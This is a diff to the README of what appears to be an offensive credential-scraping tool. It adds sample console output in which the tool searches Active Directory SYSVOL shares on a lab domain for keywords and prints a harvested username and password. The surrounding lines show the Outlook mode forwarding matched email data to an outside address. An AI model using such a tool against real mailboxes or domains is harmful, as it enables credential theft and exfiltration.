@@ -77,3 +77,29 @@ Enter additional keywords (comma-separated):
 happy1
 Matching email found. Forwarded the email information to dhfrdfdg@REDACTED.com
 ```
+
+### Example Option 2 DC scrape with user defined keyword
+
+```
+C:\Users\user2>C:\Users\user2\Desktop\Outlook_and_DC_Scraper_Combined.exe
+Please select an option:
+1. Run Outlook Email Search
+2. Run Active Directory Keyword Search
+3. Exit
+2
+Please provide at least one keyword as a command-line argument.
+happy
+Match found in file \\WIN-4Q0A4190APL.hacklab.local\SYSVOL\HACKLAB.LOCAL\Scripts\Test1\Herllo.txt!
+Additional keywords found in the context:
+user
+username
+name
+username:
+username:
+Context:
+sfsfisfjhsf sfjbsfj sf sf
+
+
+username: happy1
+password: test1
+```
